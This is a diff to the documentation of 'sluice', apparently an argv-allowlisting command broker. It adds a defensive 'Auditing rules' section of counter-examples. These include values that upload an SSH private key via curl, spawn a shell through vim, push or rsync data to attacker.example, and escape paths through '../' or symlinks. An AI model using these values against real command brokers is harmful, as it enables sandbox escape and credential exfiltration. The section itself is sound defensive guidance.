@@ -14,6 +14,7 @@ Complete syntax and semantics. For an introduction and tutorial, see
 - [Wire protocol](#wire-protocol)
 - [CLI](#cli)
 - [Error codes](#error-codes)
+- [Auditing rules](#auditing-rules)
 - [Production checklist](#production-checklist)
 
 ---
@@ -56,7 +57,7 @@ defaults:
   timeout = 30s
   env     = HOME,PATH,LANG
 
-git -C /home/agent/work log --oneline -n #1
+git --no-pager -C /srv/mirror/project log --oneline -n #1
   1 = ^[1-9][0-9]?$
 
 /bin/sh -c 'set -e; date; uptime'      ; quoted ';' is literal
@@ -199,12 +200,11 @@ Each rule's stanza accepts the same attributes as `defaults:` (with the
 `logfile` exception), plus per-slot regexes.
 
 ```
-git log -n #count
-  count = ^[1-9][0-9]?$       ; per-slot regex (numeric slot #1)
+journalctl --user --no-pager -u app.service -n #count
+  count = ^[1-9][0-9]{0,3}$   ; per-slot regex (named slot #count)
   timeout = 5s                ; rule override
-  env     = HOME,LANG,PAGER   ; rule override
-  log     = exit-only         ; rule override
-  stdoutfile = /home/agent/.local/state/sluice/git/c#$call.out
+  env     = HOME,LANG         ; rule override
+  stdoutfile = /home/agent/.local/state/sluice/journal/c#$call.out
 ```
 
 ### Per-slot regex
@@ -246,7 +246,7 @@ sort #opt #file
   file = ^[a-z]+\.txt$
   allow_dash = opt
 
-git commit -m #msg          ; the value of -m is never parsed as an option
+logger -t agent -- #msg     ; after `--`, the value is message text
   allow_any = msg
 ```
 
@@ -544,9 +544,9 @@ Match an argv against the rules without running anything. Returns 0
 and prints the matching rule and slot bindings, or 1 if no match.
 
 ```sh
-$ sluice match ~/.config/sluice/agent.rules git -C ~/work add src/main.rs
-match: rule at line 10
-  #path = "src/main.rs"
+$ sluice match ~/.config/sluice/agent.rules gh pr view 42 -R example-org/project --json number,title,state,url
+match: rule at line 17
+  #number = "42"
 ```
 
 ### `sluice serve --rules <file> --socket <path>`
@@ -641,6 +641,169 @@ follow the convention `128 + |sluice_error|`:
 
 ---
 
+## Auditing rules
+
+**sluice checks the shape of an argv. It does not understand the
+program it runs.** A rule grants everything that program can be made
+to do with any value your regexes accept, any bytes on stdin, and any
+file the caller can write — running as the broker's uid, outside the
+sandbox. That set is almost always larger than the one command you had
+in mind, and the gap rarely shows from reading the rule. Rules that
+look the most harmless are often the dangerous ones: the risk is in
+the program, not in the slots.
+
+Audit every rule as if the caller were trying to escape, because a
+compromised or misled caller will. The patterns below are how rules
+leak; each one has been missed by careful people.
+
+**Every rule in the tables below is a counter-example — do not copy
+it.** Each shows a rule that looks reasonable, a value or file that
+gets through, and what it costs.
+
+### 1. A rule with no slots is not automatically safe
+
+The program can take its instructions from somewhere other than argv.
+
+| Rule | What the caller controls | Result |
+|---|---|---|
+| `python3` | stdin is the program | arbitrary code |
+| `sqlite3 /srv/app/data.db` | stdin is CLI input; `.shell` and `.system` run commands | arbitrary code |
+| `make -C /work test` | `/work/Makefile`, when the caller can write `/work` | arbitrary code |
+| `git -C /work status` | `/work/.git/config` (`core.fsmonitor`, `core.pager`, filters) and `/work/.git/hooks/` | arbitrary code |
+| `npm install` in `/work` | `package.json` install scripts | arbitrary code |
+| `git -C /srv/repo log` | nothing writable — but when the caller's stdout is a terminal, git starts a pager, and `less` runs `!command` | arbitrary code |
+
+Stdin is passed through untouched and is not constrained by any rule.
+Any program that reads code, commands or configuration from stdin, from
+its working directory, or from files the caller can write, is a
+code-execution grant. For the pager case, put the program's no-pager
+flag in the rule (`git --no-pager log …`).
+
+### 2. The program reads options and directives out of values
+
+sluice refuses slot values starting with `-` unless the slot is in
+`allow_dash`. That covers getopt-style options only. Programs have
+other ways to turn a value into an instruction:
+
+| Rule | Value | Result |
+|---|---|---|
+| `curl -d #data https://api.example.com/notes` | `@/home/user/.ssh/id_ed25519` | uploads the private key (`@` means "read this file") |
+| `vim #file` | `+!sh` | runs a shell (`+` is an ex command) |
+| `cc #src -o /work/out` | `@/work/args.txt` | reads further arguments from a file the caller wrote |
+| `tar -xf #archive -C /work` | an archive with `../` or absolute member paths, or symlinks | writes outside `/work` |
+
+Read the program's manual for every syntax a positional value can
+take, not just its flags. Every `allow_dash` and `allow_any` reopens
+the option surface for that slot on purpose — `sluice check` lists them
+so each one is a visible decision.
+
+### 3. Something downstream parses the arguments again
+
+Some programs hand their arguments to another interpreter. Then the
+regex has to rule out that interpreter's syntax too, and that is
+nearly impossible for free text.
+
+| Rule | Why |
+|---|---|
+| `ssh backup.example.net du -sh #dir` | ssh joins its arguments into one command line for the remote login shell: `;`, `$(…)`, quotes and globs are shell syntax on the far side |
+| `sh -c #script`, `bash -c …`, `su -c …` | the slot *is* shell code |
+| `find /srv -name #pattern -exec …`, `xargs …`, `env …`, `timeout 30 #cmd`, `nice …`, `watch …` | the slot ends up in a command position |
+| `docker exec app #arg`, `kubectl exec …` | a second argv crosses another boundary with its own parsing |
+
+The fix is to keep caller-composed text off the command line: send it
+on stdin to a program that reads data from stdin, and keep argv to
+values a strict regex pins down (`^[a-z][a-z0-9-]{0,40}$`).
+
+### 4. Paths escape the place the regex seems to name
+
+| Rule and regex | Value that matches | Result |
+|---|---|---|
+| `tar -czf /backups/out.tgz #dir`, `dir = ^[a-z0-9/._-]+$` | `../../home/user` | archives your home |
+| same | `/etc` | absolute paths match too |
+| `cat #file`, `file = ^reports/[a-z0-9_.-]+$` | `reports/latest` where the caller made `latest` a symlink | reads anything the broker can |
+
+Anchor paths to a fixed prefix, forbid `..` (leave `.` out of the class
+or require `^[a-z0-9_-]+(/[a-z0-9_-]+)*$`), and remember a regex sees
+the string, never what is on disk: a path inside a directory the caller
+can write can be a symlink to anywhere.
+
+### 5. The regex is looser than it reads
+
+- `.` matches any character except newline, and `.*` / `.+` accept
+  nearly everything: they are `allow_any` with extra steps.
+- `[\x20-\x7e]` (printable ASCII) includes `;`, `|`, `&`, `$`, quotes,
+  backticks and `>`.
+- `\d`, `\w` and `\s` are Unicode-aware: `\d` matches non-ASCII digits,
+  `\w` matches letters from every script, `\s` matches newline. Spell
+  out ASCII classes (`[0-9]`, `[A-Za-z0-9_]`) or put `(?-u)` in front.
+- A class with `-` in it (`[A-Za-z0-9._/-]`) is fine for the middle of a
+  value; sluice's leading-dash refusal is what keeps it from being an
+  option — so `allow_dash` on such a slot reopens it.
+
+Test each regex against the worst value you can construct, with
+`sluice match`, before you trust it.
+
+### 6. A value names where data goes, and the child holds credentials
+
+The child inherits what `env` passes through and everything the
+broker's uid can read: `$HOME` with its tokens, `SSH_AUTH_SOCK`, cloud
+credentials. A slot that picks a *destination* turns that into
+exfiltration, with no code execution needed.
+
+| Rule | Value | Result |
+|---|---|---|
+| `git -C /work push #remote main` | `https://attacker.example/x.git` | the repository leaves |
+| `curl -T /work/report.pdf #url` | any URL | the file leaves |
+| `rsync -a /work/ #dst` with `env = SSH_AUTH_SOCK` | `attacker.example:loot/` | the tree leaves, authenticated as you |
+
+Fix destinations in the rule as literals. Pass a credential through
+`env` only to a rule whose every argument is fixed or pinned.
+
+### 7. Rules combine
+
+Audit the rule *set*, not each rule. Two rules that are each harmless
+can compose into one that is not.
+
+```
+tee /home/user/.config/app/config.toml     ; caller writes the file via stdin
+systemctl --user restart app               ; ...then makes it take effect
+```
+
+Together they let the caller run `app` with any configuration, and
+every option `app` reads from its config becomes reachable. Look for
+any rule whose output — a file, a directory, a git ref — another rule
+reads, executes or loads.
+
+### Per-rule procedure
+
+For every rule, before it goes live:
+
+1. Read the program's manual end to end: options, every syntax a
+   positional value accepts, subcommands, configuration it reads (from
+   the working directory, `$HOME`, the repository), environment it
+   honours, programs it starts (pagers, editors, hooks, plugins,
+   helpers), and where it can send data.
+2. For each slot, write down the worst value the regex accepts and try
+   it with `sluice match`.
+3. For the rule as a whole, list what it reads that the caller can
+   write: stdin, its `cwd`, files in writable directories.
+4. Check what the child receives: `env` passthrough, the broker uid's
+   files and sockets.
+5. Check it against every other rule (pattern 7).
+6. If a rule is a code-execution grant on purpose — running a test
+   suite the caller wrote, for instance — say so in a comment above it,
+   and run the broker as a dedicated unprivileged uid that holds
+   nothing worth taking. The regex can't make such a rule safe; only the
+   broker's identity can bound it.
+
+Audit again whenever a rule is added or changed, the invoked program is
+upgraded (new options, new config keys), the caller gains a writable
+path, or the broker's uid or environment changes. Then read the
+manifest: `reject` events are a caller probing the edges, and accepted
+`argv` values show what the rules are really being used for.
+
+---
+
 ## Production checklist
 
 This list is for **multi-tenant / shared-host deployment** — sluice
@@ -664,8 +827,9 @@ For shared-host deployment, before going live, verify:
 - [ ] `exec_path` is **explicit** (not `inherit`). The default is good
       for most cases.
 - [ ] `audit = strict` (the default — don't change without a reason).
-- [ ] Every `allow_any` and `allow_dash` entry in the `sluice check`
-      output is intended.
+- [ ] Every rule has been through the
+      [per-rule procedure](#per-rule-procedure), and every `allow_any`
+      and `allow_dash` entry in the `sluice check` output is intended.
 - [ ] Rules are tested with `sluice check` and a representative set of
       `sluice match` invocations.
 - [ ] `logrotate` configured for the manifest. Sluice reopens on
